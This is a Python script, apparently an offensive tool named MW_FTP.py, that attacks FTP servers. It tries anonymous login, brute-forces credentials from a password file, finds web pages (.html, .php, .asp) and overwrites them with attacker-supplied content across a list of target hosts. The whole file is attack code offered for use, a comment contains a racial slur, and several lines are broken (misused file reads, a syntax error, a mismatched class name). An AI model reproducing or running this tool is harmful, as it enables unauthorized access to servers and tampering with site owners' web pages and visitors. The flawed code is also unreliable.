import ftplib, time, argparse 

class FTP_Cell:
    def __init__(self, host_IP=None, username=None, password=None):
        self.host_IP = host_IP 
        self.username = username 
        self.password = password 

    def anon_probe(self):
        ftp = ftplib.FTP(self.host_IP)

        try:
            ftp.login('ANON', 'no@one.com') 
            print(f'\n[+] Anonymous Probe Successful for {self.host_IP}')
            self.username, self.password = 'ANON', 'non@one.com'
            return True 

        except Exception as e:
            print(f'\n[-] Anonymous Probe Unsuccessful for {self.host_IP}\n [>] Exception: {e}')
            return False 

        finally:
            ftp.quit() 

# ftp brute that shit nigguh 
    def brute_logon(self, password_file):

        if self.username and self.password:
            print(f'[!] Username and password already found!') 
            return True 

        elif not self.username or not self.password: 
            with open(password_file) as pf:

                ftp = ftplib.FTP(self.host_IP) 
                tested = 0 
                total = len(pf.readlines()) 

                for line in pf.readlines():
                    username = line.split(':')[0]
                    password = line.split(':').strip('\r').strip('\n')

                    print(f'[+] Testing: {username}/{password}')
                    tested += 1 

                    try:
                        ftp.login(username, password) 
                        print(f'\n[+] Brute Logon SUccess: {username}/{password} for {self.host_IP}')
                        self.username, self.password = username, password 
                        ftp.quit() 
                        return True 

                    except Exception as e:
                        print(f'\n[-] Tested: {tested}/{total}')

                    time.sleep(1)

            print(f'\n[!] Unable to brute force')
            ftp.quit() 
            return False 

    def scan_default(self):
        if not self.host_IP or not self.username or not self.password:
            print(f'[-] You have incomplete credentials {self.host_IP} {self.username} {self.password}')
            return False 
        
        else:
            
            ftp = ftplib.FTP(self.host_IP) 
            ftp.login(self.username, self.password) 

            try: 

                folder_contents = ftp.nlst()

            except Exception as e:

                print(f'[-] Cant access folder contents brodi!')
                ftp.close() 
                return False 

            output = [] 
            for file in folder_contents: 
                uniformed_file = file.lower() 
                
                if '.htm' in uniformed_file or '.html' in uniformed_file or '.php' in uniformed_file or '.asp' in uniformed_file:
                    print(f'[+] Default file found: {file}')
                    output.append(file)

            ftp.close() 
            return output 
    def inject_page(self, page, new_file):
        if not self.host_IP or not self.username or not self.password:
            print(f'[-] Incomplete credentials {self.host_IP} {self.username} {self.password}')
            return False 

        else:

            ftp = ftplib.FTP(self.host_IP) 
            ftp.login(self.username, self.password) 

            with open(page + ".tmp", 'w') as f:
                ftp.retrlines('RETR ' + page, f.write)
                print(f'[+] DOwnlaoded Page: {page}')

                f.write(new_file) 
                print(f'[+] Overwrite Page: {page} -> {new_file}')

                ftp.storlines('STOR ' + page, open(page _ '.tmp'))
                print(f'[+] Uploaded New Page: {page}')

    def attack(self, new_file):
        default_pages = self.scan_default() 

        for page in default_pages: 
            self.inject_page(page, new_file) 

if __name__ == '__main__':


    parser = argparse.ArgumentParser(usage='python3 MW_FTP.py HOST_IP[S] -r INJECT_PAGE [-f USERPASS_FILE]')
    parser.add_argument('host_IPs', type=str, metavar='HOST_IP[S]', nargs='+', help='specify one or more target hosts separated by commas (no spaces)')
    parser.add_argument('-r', type=str, metavar='INJECT_PAGE', required=True, help='specify an injection page')
    parser.add_argument('-f', type=str, metavar='USEREPASSWORD_FILE', help='specify user/password file for brute-force attack')

    args = parser.parse_args() 
    host_IPs = str(args.host_IPs).split(',')
    inject_html = args.r 
    password_file = args.f 

    for host_IP in host_IPs:
        curr_cell = FTP_CELL(host_IP)

        if curr_cell.anon_probe():
            print('[+] Using Anonymous Creds to attack')
            curr_cell.attack(inject_html) 

        elif password_file: 
            curr_cell.brute_logon(password_file) 
            if curr_cell.username and curr_cell.password:
                print('[+] Using Brute-forced creds to attack')
                curr_cell.attack(inject_html) 
                



            